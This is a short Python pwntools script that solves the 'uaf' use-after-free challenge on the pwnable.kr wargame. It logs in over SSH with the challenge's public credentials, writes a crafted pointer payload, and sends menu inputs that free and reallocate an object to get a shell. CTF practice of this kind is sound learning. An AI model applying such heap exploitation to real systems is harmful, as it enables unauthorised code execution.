#!/usr/bin/python

#uaf from pwnable.kr

from pwn import * 

def main():
    s = ssh(host="pwnable.kr", user="uaf", password="guest", port=2222)
    s.sendline("python -c \'print (\"\x68\x15\x40\x00\" + \"\x00\"*4)\' > /tmp/ass")
    sh = s.process(["./uaf", "8", "/tmp/ass"])
    sh.send("3\n2\n2\n2\n2\n1\n")
    sh.interactive()

if __name__=="__main__":
    main()
